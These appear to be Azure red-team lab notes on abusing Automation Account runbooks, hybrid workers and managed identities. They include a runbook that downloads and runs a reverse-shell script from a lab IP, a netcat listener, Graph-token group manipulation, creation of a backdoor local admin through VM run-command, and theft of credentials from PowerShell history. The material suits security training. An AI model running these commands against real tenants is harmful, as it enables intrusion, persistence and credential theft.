# Privilege Escalation/Lateral Movement

#### Automation Account

* Azure's automation service that allows to automate tasks for Azure resources, on-prem infra and other cloud providers.
* Supports Process Automation using Runbooks, Configuration Management (supports DSC), update management and shared resources (credentials, certificates, connections etc) for both Windows and Linux resources hosted on Azure and on-prem.
* Some common scenarios for automation as per Microsoft(documentation):
  * Deploy VMs across a hybrid environment using run books.
  * Identify configuration changes
  * Configure VMs
  * Retrieve Inventory

**Automation Account - Managed Identities**

* Managed Identity is used to provide authentication for managing Azure resources.
* Now retired, Run As account used to have the Contributor role in the current subscription.
* Many organizations simply use the same permissions for the Managed Identity now.
* The Managed Identity can only be used from inside a Runbook, so Contributor on a Runbook = profit!

**Automation Account - Runbooks**

* Runbook contains the automation logic and code that you want to execute.
* Azure provides both Graphical and Textual (PowerShell, PowerShell Workflow and Python) Runbooks.
* You can use the Shared Resources (credentials, certificates, connections etc) and the privileges of the Run As account from a Runbook.
* Always checkout Runbooks! They often have credentials that are not stored in the shared resources.
* By default, only signed script can be run on a VM.
* Runbooks can run in Azure Sandbox or a Hybrid Runbook Worker

**Automation Account - Hybrid Worker**

* This is used when a Runbook is to be run on a non-azure machine.
* A user-defined hybrid runbook worker is a member of hybrid runbook worker group.
* The Log Analytics Agent is deployed on the VM to register it as a hybrid worker.
* The hybrid worker jobs run as `SYSTEM` on Windows and `nxautomation` account on Linux

**Privilege Escalation - Automation Accoun**

* Automation Account comes very handy in privilege escalation:
  * Usually, high privileges for the Managed Identity.
  * Often, clear-text credentials can be found in Runbooks. For example, a PowerShell runbook may have admin credentials for a VM to use `PSRemoting`.
  * Access to connections, key vaults from a runbook.
  * Ability to run commands on on-prem VMs if hybrid workers are in use.
  * Ability to run commands on VMs using DSC in configuration management.

[Abusing Azure DSC — Remote Code Execution and Privilege Escalation](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

**Lateral Movement from cloud to on-prem using command execution on a hybrid worker**

```batch
C:\\AzAD\\Tools\\netcat-win32-1.12\\nc64.exe -lvp 4444
ls env:

az ad signed-in-user show 

az extension add --upgrade -n automation
az automation account list

az ad signed-in-user list-owned-objects
az account get-access-token --resource-type ms-graph
```

Use the `ms-graph` token to add user to the group.

```powershell
$Token = "eyJ0.."
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
$params = @{
 "@odata.id" = "<https://graph.microsoft.com/v1.0/directoryObjects/f66e133c-bd01-4b0b-b3b7-7cd949fd45f3>"
}
# GroupID of Automation Admins group we are adding MarkDwalden to the group.
New-MgGroupMemberByRef -GroupId e6870783-1378-4078-b242-84c08c6dc0d7 -BodyParameter $params
```

Requesting token for ARM

```batch
az automation account list
az role assignment list --assignee MarkDWalden@defcorphq.onmicrosoft.com

az account get-access-token
az account get-access-token --resource-type ms-graph
```

```powershell
$accesstoken = "eyJ0.."
$MSGraphToken = "eyJ0.."
Connect-AzAccount -AccessToken $accesstoken -MicrosoftGraphAccessToken $MSGraphToken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
Get-AzRoleAssignment

# Check if a hybrid worker group exists
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
```

```powershell
# content of student43.ps1
powershell "IEX (New-Object Net.Webclient).downloadstring('http:///172.16.150.43:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.43 -Port 4444"
```

```powershell
Import-AzAutomationRunbook -Name student43 -Path C:\\AzAD\\Tools\\student43.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
Publish-AzAutomationRunbook -RunbookName student43 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
Start-AzAutomationRunbook -RunbookName student43 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

**Abuse the permission of a Managed Identity on an App Service to get command execution on an Azure VM and extract credentials from the target VM**



```powershell
Connect-AzAccount -AccessToken $AccessToken -AccountId 064aaf57-30af-41f0-840a-0e21ed149946

Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile
Get-AzNetworkInterface -Name bkpadconnect368
Get-AzPublicIpAddress -Name bkpadconnectIP
```

```powershell
$passwd = ConvertTo-SecureString "Stud43Password@123" -AsPlainText -Force
New-LocalUser -Name student43 -Password $passwd 
Add-LocalGroupMember -Group Administrators -Member student43
```

```powershell
Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\\AzAD\\Tools\\adduser.ps1' -Verbose
```

```powershell
$password = ConvertTo-SecureString 'StudxPassword@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('studentx', $Password)
$sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess

Get-LocalUser
cat C:\\Users\\bkpadconnect\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
```

\
